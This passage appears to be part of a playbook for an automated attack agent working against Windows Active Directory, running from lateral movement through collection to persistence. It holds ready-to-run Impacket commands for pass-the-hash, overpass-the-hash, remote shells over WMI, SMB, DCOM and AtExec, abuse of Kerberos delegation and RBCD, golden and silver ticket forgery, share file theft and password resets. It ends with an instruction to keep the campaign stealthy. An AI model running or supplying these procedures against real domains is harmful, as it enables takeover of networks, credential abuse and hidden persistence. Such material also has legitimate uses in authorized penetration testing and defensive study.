- ATT&CK: T1550.002 (Use Alternate Authentication Material: Pass the Hash)

Purpose: authenticate to a host over SMB with a captured NTLM hash using PsExec.

Inputs: a user object with `ntlm_hash` from `users`, plus the target host.

Procedure (one atomic action):

```
python -m impacket.examples.psexec -hashes :<ntlm-hash> <domain.name>/<user>@<target-ip>
```

If the LM half is known, pass `-hashes <lm-hash>:<ntlm-hash>`.

Outputs: mark the target host `compromised`:

```
python scripts/state.py merge hosts[<index>] '{"compromised": true}'
```

Rollback: if authentication fails with the hash, `mark-stale` the user object and re-run `credential.dump-secrets` or `credential.dcsync` to refresh the hash.

## 3.2 Pass-the-Hash (WMI)

- Technique id: `lateral.pth-wmiexec`
- ATT&CK: T1550.002 (Pass the Hash)

Purpose: authenticate to a host over WMI with a captured NTLM hash.

Inputs: a user object with `ntlm_hash` from `users`, plus the target host.

Procedure (one atomic action):

```
python -m impacket.examples.wmiexec -hashes :<ntlm-hash> <domain.name>/<user>@<target-ip>
```

Outputs: mark the target host `compromised`.

Rollback: if authentication fails, `mark-stale` the user object and refresh the hash.

## 3.3 Pass-the-Hash (SMBExec)

- Technique id: `lateral.pth-smbexec`
- ATT&CK: T1550.002 (Pass the Hash)

Purpose: authenticate to a host over SMB named pipes with a captured NTLM hash.

Inputs: a user object with `ntlm_hash` from `users`, plus the target host.

Procedure (one atomic action):

```
python -m impacket.examples.smbexec -hashes :<ntlm-hash> <domain.name>/<user>@<target-ip>
```

Outputs: mark the target host `compromised`.

Rollback: if authentication fails, `mark-stale` the user object and refresh the hash.

## 3.4 Over-Pass-the-Hash

- Technique id: `lateral.overpass-the-hash`
- ATT&CK: T1550.002 (Pass the Hash, ticket-producing variant)

Purpose: request a Kerberos TGT directly from an NTLM hash, then use the ticket.

Inputs: a user object with `ntlm_hash` (or `kerberos_aes256`) from `users`.

Procedure (one atomic action):

```
python -m impacket.examples.getTGT <domain.name>/<user> -hashes :<ntlm-hash>
```

Import the resulting cache, then use it with `-k -no-pass` (Kerberos only, by FQDN):

```
$env:KRB5CCNAME = "<user>.ccache"
python -m impacket.examples.psexec -k -no-pass <domain.name>/<user>@<target-fqdn>
```

Outputs:

```
python scripts/state.py add tickets.tgt '{"principal": "<user>", "ccache_file": "<user>.ccache"}'
```

Rollback: if the TGT is expired or rejected, `mark-stale` the ticket entry and re-request it from a refreshed hash.

## 3.5 Remote Shell (WMI)

- Technique id: `lateral.exec-wmiexec`
- ATT&CK: T1047 (Windows Management Instrumentation)

Purpose: obtain a remote shell on a target over WMI with plaintext credentials.

Inputs: a user object with `password` from `users`, plus the target host.

Procedure (one atomic action):

```
python -m impacket.examples.wmiexec <domain.name>/<user>:<password>@<target-ip>
```

Outputs: mark the host `compromised`; record any files of interest under `files`.

Rollback: if WMI fails on a target (service disabled, port filtered), `mark-stale` the host object and re-run the port scan to pick an available method.

## 3.6 Remote Shell (SMBExec)

- Technique id: `lateral.exec-smbexec`
- ATT&CK: T1021.002 (SMB/Windows Admin Shares)

Purpose: obtain a remote shell on a target over SMB named pipes with plaintext credentials.

Inputs: a user object with `password` from `users`, plus the target host.

Procedure (one atomic action):

```
python -m impacket.examples.smbexec <domain.name>/<user>:<password>@<target-ip>
```

Outputs: mark the host `compromised`; record any files of interest under `files`.

Rollback: if SMBExec fails, `mark-stale` the host object and re-run the port scan.

## 3.7 Remote Shell (PsExec)

- Technique id: `lateral.exec-psexec`
- ATT&CK: T1021.002 (SMB/Windows Admin Shares), T1569.002 (Service Execution)

Purpose: obtain a remote shell on a target over SMB with plaintext credentials.

Inputs: a user object with `password` from `users`, plus the target host.

Procedure (one atomic action):

```
python -m impacket.examples.psexec <domain.name>/<user>:<password>@<target-ip>
```

Outputs: mark the host `compromised`; record any files of interest under `files`.

Rollback: if PsExec fails, `mark-stale` the host object and re-run the port scan.

## 3.8 Remote Shell (DCOM)

- Technique id: `lateral.exec-dcomexec`
- ATT&CK: T1021.003 (Distributed Component Object Model)

Purpose: obtain a remote shell on a target over DCOM with plaintext credentials.

Inputs: a user object with `password` from `users`, plus the target host.

Procedure (one atomic action):

```
python -m impacket.examples.dcomexec <domain.name>/<user>:<password>@<target-ip>
```

Outputs: mark the host `compromised`; record any files of interest under `files`.

Rollback: if DCOM fails, `mark-stale` the host object and re-run the port scan.

## 3.9 Remote Shell (AtExec)

- Technique id: `lateral.exec-atexec`
- ATT&CK: T1053.002 (Scheduled Task/Job: At)

Purpose: run a single scheduled command on a target over SMB with plaintext credentials.

Inputs: a user object with `password` from `users`, plus the target host and the command to run.

Procedure (one atomic action):

```
python -m impacket.examples.atexec <domain.name>/<user>:<password>@<target-ip> "cmd /c whoami"
```

Outputs: mark the host `compromised`; record any files of interest under `files`.

Rollback: if AtExec fails, `mark-stale` the host object and re-run the port scan.

## 3.10 Delegation Enumeration

- Technique id: `lateral.delegation-enum`
- ATT&CK: T1558 (Steal or Forge Kerberos Tickets)

Purpose: discover delegation relationships in the domain.

Inputs: a user object with `password` from `users`, plus `domain.dc_ip`.

Procedure (one atomic action):

```
python -m impacket.examples.findDelegation <domain.name>/<user>:<password> -dc-ip <domain.dc_ip>
```

Interpret: `Unconstrained` captures inbound TGTs; `Constrained` enables S4U2self/S4U2proxy.

Outputs:

```
python scripts/state.py add domain.delegation '{"account": "<account>", "type": "constrained", "allowed_spns": ["<spn>"]}'
```

Rollback: if a delegation relationship is stale, `mark-stale` the entry and re-run this technique.

## 3.11 Delegation Abuse (S4U)

- Technique id: `lateral.delegation-s4u`
- ATT&CK: T1558 (Steal or Forge Kerberos Tickets)

Purpose: abuse constrained delegation (S4U2self/S4U2proxy) to obtain a service ticket impersonating another user.

Inputs: a delegation account object (with `password`) from `users`, a target `spn` from `domain.spns`, and the user to impersonate (a task-text intent, or pick a `users[]` entry with `is_domain_admin: true`).

Procedure (one atomic action):

```
python -m impacket.examples.getST -spn <spn> -impersonate <user-to-impersonate> -dc-ip <domain.dc_ip> <domain.name>/<delegation-account>:<password>
```

Then use the resulting ticket with `-k -no-pass`.

Outputs:

```
python scripts/state.py add tickets.service '{"spn": "<spn>", "principal": "<user-to-impersonate>", "impersonated_user": "<user-to-impersonate>", "ccache_file": "<user-to-impersonate>.ccache"}'
```

Rollback: if the S4U request is rejected, `mark-stale` the delegation entry and re-run `lateral.delegation-enum`.

## 3.12 Pass-the-Ticket

- Technique id: `lateral.pass-the-ticket`
- ATT&CK: T1550.003 (Use Alternate Authentication Material: Pass the Ticket)

Purpose: reuse an existing Kerberos ticket (ccache) from `tickets.*` to authenticate.

Inputs: a ticket object from `tickets.tgt`/`service`/`golden`/`silver` (its `ccache_file` and `principal`) and the target host FQDN (from `hosts[].fqdn`, populated by `discovery.host-identify`).

Procedure (one atomic action):

```
$env:KRB5CCNAME = "<ccache-file>"
python -m impacket.examples.psexec -k -no-pass <domain.name>/<principal>@<target-fqdn>
```

Outputs: mark the target host `compromised`:

```
python scripts/state.py merge hosts[<index>] '{"compromised": true}'
```

Rollback: if the ticket is expired or rejected, `mark-stale` the ticket object and re-obtain it (overpass-the-hash / golden / silver / delegation-s4u).

## 3.13 Lateral Tool Transfer

- Technique id: `lateral.tool-transfer`
- ATT&CK: T1570 (Lateral Tool Transfer)

Purpose: upload a tool to a share on a target host.

Inputs: a user object with `password` from `users`, the target host and share name from `hosts`, and a local tool from `campaign` (`campaign.tools_dir` + a name in `campaign.tools`).

Procedure (one atomic action — connect, upload one file, exit):

```
python -m impacket.examples.smbclient <domain.name>/<user>:<password>@<target-fqdn>
```

Inside the client: `use <share>`, `put <campaign.tools_dir>/<tool>`, `exit`.

Outputs:

```
python scripts/state.py add files '{"path": "\\\\<host>\\<share>\\<tool>", "description": "tool uploaded"}'
```

Rollback: if the share is unavailable, `mark-stale` the host object and re-run `discovery.share-enum`.

---

# Phase 4: Collection

## 4.1 Data from Network Shared Drive

- Technique id: `collection.share-download`
- ATT&CK: T1039 (Data from Network Shared Drive)

Purpose: download a sensitive file from an SMB share.

Inputs: a host object with `shares`, a user object with `password` from `users`, and the share name (from `hosts[].shares`). The file path to download is a task-text intent (or discovered by `ls` inside the share).

Procedure (one atomic action — connect, download one file, exit):

```
python -m impacket.examples.smbclient <domain.name>/<user>:<password>@<target-fqdn>
```

Inside the client: `use <share>`, `cd <dir>`, `get <file>`, `exit`.

Outputs:

```
python scripts/state.py add files '{"path": "<local-download-path>", "description": "downloaded from \\\\<host>\\<share>\\<file>"}'
```

Rollback: if the file is gone or the share changed, `mark-stale` the host object and re-run `discovery.share-enum`.

---

# Phase 5: Persistence

## 5.1 Golden Ticket

- Technique id: `persistence.golden-ticket`
- ATT&CK: T1558.001 (Steal or Forge Kerberos Tickets: Golden Ticket)

Purpose: forge a TGT signed with the `krbtgt` hash for long-term domain access.

Inputs: the `krbtgt` user object's `ntlm_hash`, `domain.domain_sid`, `domain.name`.

Procedure (one atomic action):

```
python -m impacket.examples.ticketer -nthash <krbtgt-hash> -domain-sid <domain.domain_sid> -domain <domain.name> <username>
```

Use the forged ticket:

```
$env:KRB5CCNAME = "<username>.ccache"
python -m impacket.examples.psexec -k -no-pass <domain.name>/<username>@<domain.dc_fqdn>
```

Outputs:

```
python scripts/state.py add tickets.golden '{"principal": "<username>", "ccache_file": "<username>.ccache"}'
```

Rollback: if the ticket is rejected, the `krbtgt` hash or SID is stale — `mark-stale` the `krbtgt` user object / `domain.domain_sid` and re-run DCSync.

## 5.2 Silver Ticket

- Technique id: `persistence.silver-ticket`
- ATT&CK: T1558.002 (Steal or Forge Kerberos Tickets: Silver Ticket)

Purpose: forge a service ticket signed with a specific service account hash.

Inputs: a service account user object's `ntlm_hash`, `domain.domain_sid`, `domain.name`, target `spn`.

Procedure (one atomic action):

```
python -m impacket.examples.ticketer -nthash <service-hash> -domain-sid <domain.domain_sid> -domain <domain.name> -spn <spn> <username>
```

Use it against that service:

```
$env:KRB5CCNAME = "<username>.ccache"
python -m impacket.examples.psexec -k -no-pass <domain.name>/<username>@<target-fqdn>
```

Common SPNs: `cifs/<host-fqdn>`, `HOST/<host-fqdn>`, `ldap/<dc-fqdn>`.

Outputs:

```
python scripts/state.py add tickets.silver '{"spn": "<spn>", "principal": "<username>", "ccache_file": "<username>.ccache"}'
```

Rollback: if rejected, `mark-stale` the service account user object and re-run `credential.dump-secrets`.

## 5.3 Create Machine Account

- Technique id: `persistence.add-computer`
- ATT&CK: T1136.002 (Create Account: Domain Account)

Purpose: add a machine account (default MAQ permits it) for later RBCD/delegation.

Inputs: `domain.name`, `domain.dc_ip`, an account with `password` from `users`, and `campaign.machine_account` (the chosen name + password).

Procedure (one atomic action):

```
python -m impacket.examples.addcomputer -computer-name '<campaign.machine_account.name>' -computer-pass '<campaign.machine_account.password>' -dc-ip <domain.dc_ip> <domain.name>/<user>:<password>
```

Outputs:

```
python scripts/state.py add users '{"username": "<campaign.machine_account.name>", "password": "<campaign.machine_account.password>", "is_machine_account": true, "source": "persistence.add-computer"}'
python scripts/changes.py add '{"kind": "create_machine_account", "technique_id": "persistence.add-computer", "target": "<campaign.machine_account.name>", "summary": "Created machine account <campaign.machine_account.name>", "reversal": "Remove-ADComputer -Identity <campaign.machine_account.name>"}'
```

Rollback: if the machine account no longer works, `mark-stale` it and re-create.

## 5.4 Resource-Based Constrained Delegation (RBCD)

- Technique id: `persistence.rbcd`
- ATT&CK: T1098 (Account Manipulation), T1558.005

Purpose: grant a machine account the right to impersonate on a target computer (RBCD).

Inputs: the machine account from `campaign.machine_account`, the target computer `$` name from `hosts[].machine_account` (populated by `discovery.host-identify`), `domain.dc_ip`, and an account with write DACL on the target.

Procedure (one atomic action):

```
python -m impacket.examples.rbcd -delegate-from '<campaign.machine_account.name>' -delegate-to '<target-machine-account>' -dc-ip <domain.dc_ip> -action write <domain.name>/<user>:<password>
```

Then obtain a ticket impersonating an admin:

```
python -m impacket.examples.getST -spn cifs/<target-fqdn> -impersonate <admin> -dc-ip <domain.dc_ip> <domain.name>/<campaign.machine_account.name>:<campaign.machine_account.password>
```

Outputs:

```
python scripts/state.py add domain.rbcd '{"delegate_from": "<campaign.machine_account.name>", "delegate_to": "<target-machine-account>"}'
python scripts/state.py add tickets.service '{"spn": "cifs/<target-fqdn>", "principal": "<admin>", "impersonated_user": "<admin>", "ccache_file": "<admin>.ccache"}'
python scripts/changes.py add '{"kind": "rbcd", "technique_id": "persistence.rbcd", "target": "<target-machine-account>", "summary": "Granted RBCD from <campaign.machine_account.name> to <target-machine-account>", "reversal": "Set-ADComputer <target-machine-account> -PrincipalsAllowedToDelegateToAccount $null"}'
```

Rollback: if the RBCD edge is revoked, `mark-stale` `domain.rbcd[n]` and re-run this technique.

## 5.5 Reset Account Password

- Technique id: `persistence.reset-password`
- ATT&CK: T1098 (Account Manipulation)

Purpose: reset a target account's password with admin rights.

Inputs: an admin account with `password` from `users`, the target user, and the new password (a task-text intent, like the spray candidate).

Procedure (one atomic action):

```
python -m impacket.examples.smbpasswd -newpass <new> -reset <domain.name>/<admin>:<password>@<target-ip>
```

Outputs:

```
python scripts/state.py merge users[<index>] '{"password": "<new>", "stale": false}'
python scripts/changes.py add '{"kind": "reset_password", "technique_id": "persistence.reset-password", "target": "<user>", "summary": "Reset password for <user>", "reversal": "Set-ADAccountPassword -Identity <user> -Reset"}'
```

Rollback: if the reset is later reverted, `mark-stale` the user object and re-run.

---

## Rollback Rules

Rollback is triggered whenever a command fails because a state object's field is wrong or expired. The general procedure:

1. Mark the bad object stale:

   ```
   python scripts/state.py mark-stale <path-to-the-object>
   ```

2. Do **not** re-run a different technique in this task. Mark the current technique `failed`. The scheduler will dispatch the producing technique later.
3. When that later task succeeds, overwrite the stale object and clear the flag:

   ```
   python scripts/state.py unset-stale <path>
   ```

> **Scalar vs object fields.** `mark-stale`/`unset-stale`/`touch` operate on *object* fields (dicts, e.g. `users[n]`, `hosts[n]`, `domain.spns[n]`) because a `stale` flag can only live on a dict. Scalar fields (e.g. `domain.dc_ip`, `domain.name`, `domain.domain_sid`) cannot carry a flag — when they go stale, mark this technique `failed`; a later task overwrites them with `set`.

Common stale cases:

| Symptom | Stale object | Re-collect with |
|---------|--------------|-----------------|
| Hash/password rejected | `users[n]` | `credential.dump-secrets` / `credential.dcsync` |
| DC unreachable / wrong IP | `domain.dc_ip` (scalar → `set`) | `discovery.orientation` |
| Kerberos ticket rejected | `tickets.tgt[n]` etc. | the ticket's producing technique |
| SPN no longer resolves | `domain.spns[n]` | `credential.kerberoast` |
| Delegation relationship changed | `domain.delegation[n]` | `lateral.delegation-enum` |
| Port/service changed on a host | `hosts[n]` | `discovery.port-scan` |
| FQDN/machine account no longer resolves | `hosts[n].fqdn` / `hosts[n].machine_account` | `discovery.host-identify` |
| Share list changed / share gone | `hosts[n].shares` | `discovery.share-enum` |
| Group membership changed | `users[n].groups` / `domain.groups[n]` | `discovery.group-enum` |
| GPP credential rejected | `users[n]` | `credential.gpp-password` |
| RBCD edge revoked | `domain.rbcd[n]` | `persistence.rbcd` |
| Machine account no longer valid | `users[n]` (machine account) | `persistence.add-computer` |

Do not retry the same failing command more than once; diagnose staleness and re-collect instead. Keep the whole campaign low-volume and stealthy.
